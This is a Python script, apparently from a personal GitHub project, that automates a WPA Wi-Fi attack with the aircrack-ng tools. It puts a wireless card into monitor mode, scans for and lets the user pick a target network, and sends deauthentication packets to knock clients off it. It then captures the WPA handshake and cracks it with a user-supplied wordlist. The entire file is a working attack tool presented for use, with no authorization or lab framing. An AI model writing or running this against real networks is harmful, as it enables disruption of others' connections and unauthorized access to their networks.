#!/usr/bin/env python3
import os
import subprocess
import time
import sys
from threading import Thread

#github : https://github.com/hcde156/batamn-wifi/
#this tool made by batman

def run_command(cmd, sudo=False):
    """Run a command with optional sudo privileges"""
    if sudo:
        cmd = ['sudo'] + cmd
    try:
        result = subprocess.run(cmd, check=True, capture_output=True, text=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"Error running command: {' '.join(cmd)}")
        print(e.stderr)
        sys.exit(1)

def scan_wifi(interface):
    """Scan for available WiFi networks using airodump-ng"""
    print("\n[+] Scanning for WiFi networks... (Ctrl+C to stop)")
    
    # Start scanning in a separate thread
    scan_proc = subprocess.Popen(
        ['sudo', 'airodump-ng', interface],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    
    # Let it run for 10 seconds
    time.sleep(10)
    scan_proc.terminate()
    
    # Parse the output
    stdout, stderr = scan_proc.communicate()
    networks = []
    
    # Parse airodump-ng output
    for line in stdout.split('\n'):
        if 'BSSID' in line:  # Skip header
            continue
        if line.strip() == '':
            continue
        parts = line.split()
        if len(parts) >= 14:
            bssid = parts[0]
            channel = parts[5]
            essid = ' '.join(parts[13:])
            networks.append({'bssid': bssid, 'channel': channel, 'essid': essid})
    
    return networks

def capture_handshake(interface, bssid, channel, output_file):
    """Capture WPA handshake"""
    print(f"\n[+] Starting handshake capture on {bssid} (Channel {channel})...")
    
    # Start airodump-ng to capture handshake
    airodump_cmd = [
        'sudo', 'airodump-ng',
        '--bssid', bssid,
        '--channel', channel,
        '--write', output_file,
        interface
    ]
    
    airodump_proc = subprocess.Popen(
        airodump_cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    
    # Start deauthentication in a separate thread
    def deauth():
        time.sleep(5)  # Wait for airodump to start
        print("[+] Sending deauthentication packets...")
        subprocess.run([
            'sudo', 'aireplay-ng',
            '--deauth', '5',
            '-a', bssid,
            interface
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    deauth_thread = Thread(target=deauth)
    deauth_thread.start()
    
    # Wait for handshake or timeout
    print("[+] Waiting for WPA handshake... (Ctrl+C to stop)")
    try:
        for _ in range(30):  # Wait up to 30 seconds
            time.sleep(1)
            # Check if handshake was captured
            if os.path.exists(f"{output_file}-01.cap"):
                cap_file = f"{output_file}-01.cap"
                result = subprocess.run(
                    ['sudo', 'aircrack-ng', cap_file],
                    capture_output=True,
                    text=True
                )
                if "WPA (1 handshake)" in result.stdout:
                    print("\n[+] WPA handshake captured successfully!")
                    airodump_proc.terminate()
                    return True
    except KeyboardInterrupt:
        airodump_proc.terminate()
        return False
    
    airodump_proc.terminate()
    print("\n[-] Failed to capture handshake within timeout period")
    return False

def main():
    # Check if running as root
    if os.geteuid() != 0:
        print("This script must be run as root. Use sudo.")
        sys.exit(1)
    
    # Get WiFi interface
    interfaces = run_command(['iwconfig']).split('\n')
    wifi_ifaces = [line.split()[0] for line in interfaces if 'IEEE 802.11' in line]
    
    if not wifi_ifaces:
        print("No WiFi interfaces found!")
        sys.exit(1)
    
    print("Available WiFi interfaces:")
    for i, iface in enumerate(wifi_ifaces):
        print(f"{i+1}. {iface}")
    
    choice = input(f"Select interface (1-{len(wifi_ifaces)}): ")
    try:
        interface = wifi_ifaces[int(choice)-1]
    except (ValueError, IndexError):
        print("Invalid selection")
        sys.exit(1)
    
    # Put interface in monitor mode
    print(f"\n[+] Setting {interface} to monitor mode...")
    run_command(['airmon-ng', 'check', 'kill'], sudo=True)
    run_command(['ip', 'link', 'set', interface, 'down'], sudo=True)
    run_command(['iwconfig', interface, 'mode', 'monitor'], sudo=True)
    run_command(['ip', 'link', 'set', interface, 'up'], sudo=True)
    
    # Scan for networks
    networks = scan_wifi(interface)
    
    if not networks:
        print("No networks found!")
        sys.exit(1)
    
    print("\nAvailable Networks:")
    for i, net in enumerate(networks):
        print(f"{i+1}. {net['essid']} (BSSID: {net['bssid']}, Channel: {net['channel']})")
    
    choice = input(f"\nSelect network to target (1-{len(networks)}): ")
    try:
        target = networks[int(choice)-1]
    except (ValueError, IndexError):
        print("Invalid selection")
        sys.exit(1)
    
    # Capture handshake
    output_file = input("Enter filename to save capture (without extension): ")
    if capture_handshake(interface, target['bssid'], target['channel'], output_file):
        # Optional: Crack the handshake with a wordlist
        crack = input("\nWould you like to attempt to crack the handshake? (y/n): ")
        if crack.lower() == 'y':
            wordlist = input("Enter path to wordlist: ")
            if os.path.exists(wordlist):
                print("\n[+] Starting cracking process...")
                subprocess.run([
                    'sudo', 'aircrack-ng',
                    '-w', wordlist,
                    f"{output_file}-01.cap"
                ])
            else:
                print("Wordlist not found!")
    
    # Clean up
    print("\n[+] Cleaning up...")
    run_command(['airmon-ng', 'stop', interface], sudo=True)
    run_command(['service', 'network-manager', 'start'], sudo=True)
    print("[+] Done!")

if __name__ == "__main__":
    main()
